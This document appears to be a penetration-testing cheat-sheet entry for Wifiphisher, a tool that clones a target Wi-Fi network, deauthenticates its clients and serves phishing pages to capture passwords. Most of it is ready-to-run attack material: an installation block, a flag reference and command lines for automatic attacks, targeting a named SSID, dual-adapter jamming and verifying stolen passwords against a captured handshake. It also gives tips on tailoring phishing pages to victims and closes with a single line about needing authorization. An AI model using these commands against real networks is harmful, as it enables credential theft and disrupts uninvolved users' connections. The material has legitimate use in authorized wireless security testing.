# Wifiphisher

- **Category**: Wireless / Social Engineering / Evil Twin
- **Risk Level**: 🔴 Critical

---

## Description

Wifiphisher is an advanced wireless social engineering attack framework. It creates a Rogue AP with the same SSID as the target, causing clients to disconnect from the legitimate AP and connect to the attacker-controlled AP. It then serves a phishing page to trick the user into entering their Wi-Fi password or other credentials. Multiple built-in attack scenarios (phishing page templates) are included, and the entire process is automated.

## Installation

```bash
sudo apt install wifiphisher

git clone https://github.com/wifiphisher/wifiphisher.git
cd wifiphisher
sudo python3 setup.py install
```

## Parameter Reference

| Parameter | Description |
|-----------|-------------|
| `-i <iface>` | Interface for both AP and monitor mode |
| `-eI <iface>` | Interface for deauthentication (monitor mode) |
| `-aI <iface>` | Interface for rogue AP (AP mode) |
| `-iI <iface>` | Interface for internet access |
| `-pI <iface>` | Interface(s) to protect from being used |
| `-mI <iface>` | Interface for MITM |
| `-iNM` | Disable MAC randomization |
| `-kN` | Keep NetworkManager running |
| `-e <ssid>` | ESSID of the rogue Access Point |
| `-p <scenario>` | Phishing scenario to use |
| `-pK <passphrase>` | Add WPA/WPA2 protection on the rogue AP |
| `-hC <file>` | WPA/WPA2 handshake capture for passphrase verification |
| `-dE <essid>` | Deauth all BSSIDs with that ESSID |
| `-dC <channels>` | Channels to deauth on |
| `-nE` | Do not load any extensions |
| `-nD` | Skip the deauthentication phase |
| `-qS` | Stop after successfully retrieving one credential pair |
| `-lC` | Capture BSSIDs during AP selection (Lure10) |
| `-lE <bssid>` | Lure10 exploit against specified BSSID |
| `-dK` | Disable KARMA attack |
| `-cM` | Channel monitor mode |
| `-wP` | Monitor WPS-PBC button press |
| `--logging` | Log activity to file |
| `-lP <path>` | Log file path |
| `-cP <path>` | Credential log file path |
| `--payload-path <path>` | Payload path for scenarios serving a payload |

## Common Commands

### Scenario 1: List Available Attack Scenarios

```bash
# View all built-in scenarios
# Phishing page templates are stored in:
# Kali package install: /usr/lib/python3/dist-packages/wifiphisher/data/phishing-pages/
# Git install: <repo>/wifiphisher/data/phishing-pages/
ls /usr/lib/python3/dist-packages/wifiphisher/data/phishing-pages/ 2>/dev/null || \
  find / -path '*/wifiphisher/data/phishing-pages' -type d 2>/dev/null

# Wifiphisher presents an interactive scenario selection menu at startup
sudo wifiphisher
```

### Scenario 2: Fully Automatic Attack

```bash
# Auto-select target, use firmware-upgrade scenario
sudo wifiphisher

# Specify phishing scenario
sudo wifiphisher -p firmware-upgrade
```

### Scenario 3: Target a Specific Network

```bash
# Attack a specific SSID
sudo wifiphisher -e "TargetWiFi" -p firmware-upgrade

# Specify network interface
sudo wifiphisher -i wlan0 -e "TargetWiFi" -p oauth-login
```

### Scenario 4: Dual-Adapter Mode (One for Jamming, One for AP)

```bash
# wlan0: monitor/Deauth (extensions interface -eI), wlan1: Rogue AP (-aI)
sudo wifiphisher -eI wlan0 -aI wlan1 -e "TargetWiFi" -p firmware-upgrade
```

### Scenario 5: Use a Captured Handshake (Verify Entered Password)

```bash
# Use an existing handshake to verify whether the user-entered password is correct
sudo wifiphisher -e "TargetWiFi" -p firmware-upgrade \
    --handshake-capture /tmp/handshake.cap
# When the user submits a password, wifiphisher will automatically verify it against the handshake
```

## Notes & Tips

1. The entire attack relies on social engineering; success depends on how convincing the phishing page is
2. Consider customizing the phishing page for the target (copy templates to working directory or use `--payload-path`)
3. Two wireless adapters yield the best results (one for Deauth, one for the Rogue AP)
4. Once the attack succeeds, credentials are logged in the terminal output and log files
5. This tool is highly dependent on user deception; it is less effective against security-aware users
6. A clear written authorization is required for use in real penetration tests

---

## Official References

- [Wifiphisher (GitHub)](https://github.com/wifiphisher/wifiphisher)
- [Wifiphisher Documentation](https://wifiphisher.readthedocs.io/en/latest/)
